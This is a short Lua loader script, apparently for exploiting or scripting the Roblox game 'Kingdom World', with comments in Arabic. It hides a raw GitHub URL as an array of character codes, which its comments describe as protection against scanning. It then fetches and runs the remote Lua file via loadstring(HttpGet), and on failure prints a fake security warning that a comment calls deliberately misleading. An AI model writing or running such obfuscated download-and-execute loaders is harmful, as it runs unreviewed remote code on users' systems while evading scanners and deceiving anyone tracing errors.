--====================================================================--
--                   KINGDOM WORLD SCRIPT - RM8                       --
--             [HIGHLY ENCRYPTED & PROTECTED VERSION]                 --
--====================================================================--

-- مصفوفة البيانات المشفرة لـ URL الأساسي (حماية متقدمة ضد الفحص)
local _0xPayload = {
    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 
    117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 
    109, 47, 82, 77, 56, 53, 49, 49, 47, 82, 77, 56, 47, 109, 97, 105, 110, 47, 
    82, 77, 56, 95, 75, 105, 110, 103, 100, 111, 109, 95, 118, 49, 46, 108, 117, 97
}

-- محرك فك التعمية والتشغيل الذاتي
local function _0xExecute()
    local _0xConstructed = ""
    for _0xIdx = 1, #_0xPayload do
        _0xConstructed = _0xConstructed .. string.char(_0xPayload[_0xIdx])
    end
    
    local _0xRun, _0xErr = pcall(function()
        loadstring(game:HttpGet(_0xConstructed))()
    end)
    
    if not _0xRun then
        -- رسالة مضللة لحماية السورس عند محاولة تتبع الأخطاء
        warn("[RM8 System]: Security integrity check failed.")
    end
end

-- الإطلاق الآمن
_0xExecute()
